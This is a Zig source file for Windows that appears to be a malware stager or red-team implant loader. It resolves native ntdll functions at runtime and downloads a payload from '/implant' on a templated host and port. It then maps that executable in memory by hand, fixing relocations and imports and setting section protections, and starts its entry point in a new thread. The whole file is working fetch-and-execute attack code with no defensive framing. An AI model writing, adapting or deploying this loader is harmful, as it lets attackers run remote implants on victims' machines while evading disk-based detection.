const std = @import("std");

const WINAPI = std.builtin.CallingConvention.winapi;

const HANDLE = *anyopaque;
const PVOID = *anyopaque;
const ULONG = u32;
const USHORT = u16;
const DWORD = u32;
const WORD = u16;
const BOOL = i32;
const HMODULE = *anyopaque;
const LPCSTR = [*:0]const u8;
const NTSTATUS = i32;

fn nt_success(status: NTSTATUS) bool {
    return status >= 0;
}

const MEM_COMMIT = 0x1000;
const MEM_RESERVE = 0x2000;
const PAGE_READWRITE = 0x04;
const PAGE_READONLY = 0x02;
const PAGE_EXECUTE_READ = 0x20;
const PAGE_EXECUTE_READWRITE = 0x40;
const THREAD_ALL_ACCESS = 0x1FFFFF;

const IMAGE_DOS_SIGNATURE = 0x5A4D;
const IMAGE_NT_SIGNATURE = 0x00004550;
const IMAGE_ORDINAL_FLAG64 = 0x8000000000000000;
const IMAGE_REL_BASED_DIR64 = 10;
const IMAGE_REL_BASED_HIGHLOW = 3;
const IMAGE_SCN_MEM_EXECUTE = 0x20000000;
const IMAGE_SCN_MEM_WRITE = 0x80000000;
const IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
const IMAGE_DIRECTORY_ENTRY_IMPORT = 1;

const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0;

const HINTERNET = *anyopaque;

const IMAGE_DOS_HEADER = extern struct {
    e_magic: WORD,
    e_cblp: WORD,
    e_cp: WORD,
    e_crlc: WORD,
    e_cparhdr: WORD,
    e_minalloc: WORD,
    e_maxalloc: WORD,
    e_ss: WORD,
    e_sp: WORD,
    e_csum: WORD,
    e_ip: WORD,
    e_cs: WORD,
    e_lfarlc: WORD,
    e_ovno: WORD,
    e_res: [4]WORD,
    e_oemid: WORD,
    e_oeminfo: WORD,
    e_res2: [10]WORD,
    e_lfanew: i32,
};

const IMAGE_FILE_HEADER = extern struct {
    Machine: WORD,
    NumberOfSections: WORD,
    TimeDateStamp: DWORD,
    PointerToSymbolTable: DWORD,
    NumberOfSymbols: DWORD,
    SizeOfOptionalHeader: WORD,
    Characteristics: WORD,
};

const IMAGE_DATA_DIRECTORY = extern struct {
    VirtualAddress: DWORD,
    Size: DWORD,
};

const IMAGE_OPTIONAL_HEADER64 = extern struct {
    Magic: WORD,
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: DWORD,
    SizeOfInitializedData: DWORD,
    SizeOfUninitializedData: DWORD,
    AddressOfEntryPoint: DWORD,
    BaseOfCode: DWORD,
    ImageBase: u64,
    SectionAlignment: DWORD,
    FileAlignment: DWORD,
    MajorOperatingSystemVersion: WORD,
    MinorOperatingSystemVersion: WORD,
    MajorImageVersion: WORD,
    MinorImageVersion: WORD,
    MajorSubsystemVersion: WORD,
    MinorSubsystemVersion: WORD,
    Win32VersionValue: DWORD,
    SizeOfImage: DWORD,
    SizeOfHeaders: DWORD,
    CheckSum: DWORD,
    Subsystem: WORD,
    DllCharacteristics: WORD,
    SizeOfStackReserve: u64,
    SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64,
    SizeOfHeapCommit: u64,
    LoaderFlags: DWORD,
    NumberOfRvaAndSizes: DWORD,
    DataDirectory: [16]IMAGE_DATA_DIRECTORY,
};

const IMAGE_NT_HEADERS64 = extern struct {
    Signature: DWORD,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
};

const IMAGE_SECTION_HEADER = extern struct {
    Name: [8]u8,
    Misc: extern union { PhysicalAddress: DWORD, VirtualSize: DWORD },
    VirtualAddress: DWORD,
    SizeOfRawData: DWORD,
    PointerToRawData: DWORD,
    PointerToRelocations: DWORD,
    PointerToLinenumbers: DWORD,
    NumberOfRelocations: WORD,
    NumberOfLinenumbers: WORD,
    Characteristics: DWORD,
};

const IMAGE_BASE_RELOCATION = extern struct {
    VirtualAddress: DWORD,
    SizeOfBlock: DWORD,
};

const IMAGE_IMPORT_DESCRIPTOR = extern struct {
    OriginalFirstThunk: DWORD,
    TimeDateStamp: DWORD,
    ForwarderChain: DWORD,
    Name: DWORD,
    FirstThunk: DWORD,
};

const IMAGE_IMPORT_BY_NAME = extern struct {
    Hint: WORD,
    Name: [1]u8,
};

const NtAllocateVirtualMemoryFn = *const fn (HANDLE, *?*anyopaque, usize, *usize, ULONG, ULONG) callconv(WINAPI) NTSTATUS;
const NtProtectVirtualMemoryFn = *const fn (HANDLE, *?*anyopaque, *usize, ULONG, *ULONG) callconv(WINAPI) NTSTATUS;
const NtCreateThreadExFn = *const fn (*?HANDLE, DWORD, ?*anyopaque, HANDLE, *anyopaque, ?*anyopaque, ULONG, usize, usize, usize, ?*anyopaque) callconv(WINAPI) NTSTATUS;
const NtWaitForSingleObjectFn = *const fn (HANDLE, BOOL, ?*i64) callconv(WINAPI) NTSTATUS;

var fnNtAllocateVirtualMemory: ?NtAllocateVirtualMemoryFn = null;
var fnNtProtectVirtualMemory: ?NtProtectVirtualMemoryFn = null;
var fnNtCreateThreadEx: ?NtCreateThreadExFn = null;
var fnNtWaitForSingleObject: ?NtWaitForSingleObjectFn = null;

extern "kernel32" fn GetModuleHandleA(lpModuleName: ?LPCSTR) callconv(WINAPI) ?HMODULE;
extern "kernel32" fn GetProcAddress(hModule: HMODULE, lpProcName: LPCSTR) callconv(WINAPI) ?*anyopaque;
extern "kernel32" fn LoadLibraryA(lpLibFileName: LPCSTR) callconv(WINAPI) ?HMODULE;

extern "winhttp" fn WinHttpOpen(pszAgentW: ?[*:0]const u16, dwAccessType: DWORD, pszProxyW: ?[*:0]const u16, pszProxyBypassW: ?[*:0]const u16, dwFlags: DWORD) callconv(WINAPI) ?HINTERNET;
extern "winhttp" fn WinHttpConnect(hSession: HINTERNET, pswzServerName: [*:0]const u16, nServerPort: USHORT, dwReserved: DWORD) callconv(WINAPI) ?HINTERNET;
extern "winhttp" fn WinHttpOpenRequest(hConnect: HINTERNET, pwszVerb: ?[*:0]const u16, pwszObjectName: ?[*:0]const u16, pwszVersion: ?[*:0]const u16, pwszReferrer: ?[*:0]const u16, ppwszAcceptTypes: ?*?[*:0]const u16, dwFlags: DWORD) callconv(WINAPI) ?HINTERNET;
extern "winhttp" fn WinHttpSendRequest(hRequest: HINTERNET, lpszHeaders: ?[*:0]const u16, dwHeadersLength: DWORD, lpOptional: ?*anyopaque, dwOptionalLength: DWORD, dwTotalLength: DWORD, dwContext: usize) callconv(WINAPI) BOOL;
extern "winhttp" fn WinHttpReceiveResponse(hRequest: HINTERNET, lpReserved: ?*anyopaque) callconv(WINAPI) BOOL;
extern "winhttp" fn WinHttpReadData(hRequest: HINTERNET, lpBuffer: *anyopaque, dwNumberOfBytesToRead: DWORD, lpdwNumberOfBytesRead: *DWORD) callconv(WINAPI) BOOL;
extern "winhttp" fn WinHttpCloseHandle(hInternet: HINTERNET) callconv(WINAPI) BOOL;

const HOST: [:0]const u16 = &[_:0]u16{HOST_PLACEHOLDER};
const PORT: USHORT = PORT_PLACEHOLDER;

fn currentProcess() HANDLE {
    return @ptrFromInt(@as(usize, @bitCast(@as(isize, -1))));
}

fn resolveFuncs() bool {
    const ntdll = GetModuleHandleA("ntdll.dll") orelse return false;

    fnNtAllocateVirtualMemory = @ptrCast(GetProcAddress(ntdll, "NtAllocateVirtualMemory") orelse return false);
    fnNtProtectVirtualMemory = @ptrCast(GetProcAddress(ntdll, "NtProtectVirtualMemory") orelse return false);
    fnNtCreateThreadEx = @ptrCast(GetProcAddress(ntdll, "NtCreateThreadEx") orelse return false);
    fnNtWaitForSingleObject = @ptrCast(GetProcAddress(ntdll, "NtWaitForSingleObject") orelse return false);

    return true;
}

fn download(host: [*:0]const u16, port: USHORT, path: [*:0]const u16) ?struct { buf: [*]u8, size: DWORD } {
    const hSession = WinHttpOpen(null, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, null, null, 0) orelse return null;
    defer _ = WinHttpCloseHandle(hSession);

    const hConnect = WinHttpConnect(hSession, host, port, 0) orelse return null;
    defer _ = WinHttpCloseHandle(hConnect);

    const verb: [*:0]const u16 = &[_:0]u16{ 'G', 'E', 'T' };

    const hRequest = WinHttpOpenRequest(hConnect, verb, path, null, null, null, 0) orelse return null;
    defer _ = WinHttpCloseHandle(hRequest);

    if (WinHttpSendRequest(hRequest, null, 0, null, 0, 0, 0) == 0) return null;
    if (WinHttpReceiveResponse(hRequest, null) == 0) return null;

    var cap: usize = 0x100000;
    var baseAddr: ?*anyopaque = null;

    if (!nt_success(fnNtAllocateVirtualMemory.?(currentProcess(), &baseAddr, 0, &cap, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return null;

    const buf: [*]u8 = @ptrCast(baseAddr.?);
    var total: DWORD = 0;

    while (true) {
        var bytesRead: DWORD = 0;
        if (WinHttpReadData(hRequest, @ptrCast(buf + total), @intCast(cap - total), &bytesRead) == 0) break;
        if (bytesRead == 0) break;
        total += bytesRead;

        if (total >= cap - 0x10000) {
            var newSize: usize = cap * 2;
            var newBuf: ?*anyopaque = null;
            if (!nt_success(fnNtAllocateVirtualMemory.?(currentProcess(), &newBuf, 0, &newSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return null;
            @memcpy(@as([*]u8, @ptrCast(newBuf.?))[0..total], buf[0..total]);
            cap = newSize;
        }
    }

    if (total == 0) return null;
    return .{ .buf = buf, .size = total };
}

fn mapPE(raw: [*]u8, _: DWORD) ?*anyopaque {
    const dos: *IMAGE_DOS_HEADER = @ptrCast(@alignCast(raw));
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return null;

    const nt: *IMAGE_NT_HEADERS64 = @ptrCast(@alignCast(raw + @as(usize, @intCast(dos.e_lfanew))));
    if (nt.Signature != IMAGE_NT_SIGNATURE) return null;

    var imageSize: usize = nt.OptionalHeader.SizeOfImage;
    var baseAddr: ?*anyopaque = null;

    if (!nt_success(fnNtAllocateVirtualMemory.?(currentProcess(), &baseAddr, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return null;

    const mapped: [*]u8 = @ptrCast(baseAddr.?);

    @memcpy(mapped[0..nt.OptionalHeader.SizeOfHeaders], raw[0..nt.OptionalHeader.SizeOfHeaders]);

    const secPtr: [*]IMAGE_SECTION_HEADER = @ptrCast(@alignCast(@as([*]u8, @ptrCast(nt)) + @sizeOf(IMAGE_NT_HEADERS64)));

    for (0..nt.FileHeader.NumberOfSections) |i| {
        const sec = secPtr[i];
        if (sec.SizeOfRawData > 0) {
            @memcpy(mapped[sec.VirtualAddress .. sec.VirtualAddress + sec.SizeOfRawData], raw[sec.PointerToRawData .. sec.PointerToRawData + sec.SizeOfRawData]);
        }
    }

    const delta: i64 = @as(i64, @intCast(@intFromPtr(mapped))) - @as(i64, @intCast(nt.OptionalHeader.ImageBase));
    if (delta != 0 and nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        var reloc: *IMAGE_BASE_RELOCATION = @ptrCast(@alignCast(mapped + nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));
        while (reloc.VirtualAddress != 0) {
            const count = (reloc.SizeOfBlock - @sizeOf(IMAGE_BASE_RELOCATION)) / @sizeOf(WORD);
            const entries: [*]WORD = @ptrCast(@alignCast(@as([*]u8, @ptrCast(reloc)) + @sizeOf(IMAGE_BASE_RELOCATION)));
            for (0..count) |j| {
                const entry = entries[j];
                const relType = entry >> 12;
                const offset = entry & 0xFFF;
                if (relType == IMAGE_REL_BASED_DIR64) {
                    const patch: *u64 = @ptrCast(@alignCast(mapped + reloc.VirtualAddress + offset));
                    patch.* = @intCast(@as(i64, @intCast(patch.*)) + delta);
                } else if (relType == IMAGE_REL_BASED_HIGHLOW) {
                    const patch: *u32 = @ptrCast(@alignCast(mapped + reloc.VirtualAddress + offset));
                    patch.* = @intCast(@as(i64, @intCast(patch.*)) + delta);
                }
            }
            reloc = @ptrCast(@alignCast(@as([*]u8, @ptrCast(reloc)) + reloc.SizeOfBlock));
        }
    }

    if (nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        var imp: *IMAGE_IMPORT_DESCRIPTOR = @ptrCast(@alignCast(mapped + nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress));
        while (imp.Name != 0) {
            const modName: LPCSTR = @ptrCast(mapped + imp.Name);
            const mod = LoadLibraryA(modName);
            if (mod) |m| {
                var thunk: *u64 = @ptrCast(@alignCast(mapped + imp.FirstThunk));
                var origThunk: *u64 = if (imp.OriginalFirstThunk != 0) @ptrCast(@alignCast(mapped + imp.OriginalFirstThunk)) else thunk;
                while (origThunk.* != 0) {
                    if ((origThunk.* & IMAGE_ORDINAL_FLAG64) != 0) {
                        thunk.* = @intFromPtr(GetProcAddress(m, @ptrFromInt(origThunk.* & 0xFFFF)));
                    } else {
                        const name: *IMAGE_IMPORT_BY_NAME = @ptrCast(@alignCast(mapped + @as(usize, @intCast(origThunk.*))));
                        thunk.* = @intFromPtr(GetProcAddress(m, @ptrCast(&name.Name)));
                    }
                    thunk = @ptrFromInt(@intFromPtr(thunk) + 8);
                    origThunk = @ptrFromInt(@intFromPtr(origThunk) + 8);
                }
            }
            imp = @ptrFromInt(@intFromPtr(imp) + @sizeOf(IMAGE_IMPORT_DESCRIPTOR));
        }
    }

    for (0..nt.FileHeader.NumberOfSections) |i| {
        const sec = secPtr[i];
        var prot: ULONG = PAGE_READONLY;
        const chr = sec.Characteristics;
        if ((chr & IMAGE_SCN_MEM_EXECUTE) != 0) {
            prot = if ((chr & IMAGE_SCN_MEM_WRITE) != 0) PAGE_EXECUTE_READWRITE else PAGE_EXECUTE_READ;
        } else if ((chr & IMAGE_SCN_MEM_WRITE) != 0) {
            prot = PAGE_READWRITE;
        }

        var secBase: ?*anyopaque = @ptrCast(mapped + sec.VirtualAddress);
        var secSize: usize = if (sec.Misc.VirtualSize == 0) sec.SizeOfRawData else sec.Misc.VirtualSize;
        var oldProt: ULONG = 0;
        _ = fnNtProtectVirtualMemory.?(currentProcess(), &secBase, &secSize, prot, &oldProt);
    }

    return @ptrCast(mapped + nt.OptionalHeader.AddressOfEntryPoint);
}

pub export fn WinMainCRTStartup() callconv(WINAPI) noreturn {
    const ret = wWinMain();
    std.process.exit(@intCast(ret));
}

pub export fn wWinMainCRTStartup() callconv(WINAPI) noreturn {
    const ret = wWinMain();
    std.process.exit(@intCast(ret));
}

fn wWinMain() c_int {
    if (!resolveFuncs()) return 1;

    const path: [*:0]const u16 = &[_:0]u16{ '/', 'i', 'm', 'p', 'l', 'a', 'n', 't' };

    const result = download(HOST.ptr, PORT, path) orelse return 1;
    if (result.size < 0x100) return 1;

    const entry = mapPE(result.buf, result.size) orelse return 1;

    var hThread: ?HANDLE = null;
    if (!nt_success(fnNtCreateThreadEx.?(&hThread, THREAD_ALL_ACCESS, null, currentProcess(), entry, null, 0, 0, 0, 0, null))) return 1;

    _ = fnNtWaitForSingleObject.?(hThread.?, 0, null);
    return 0;
}
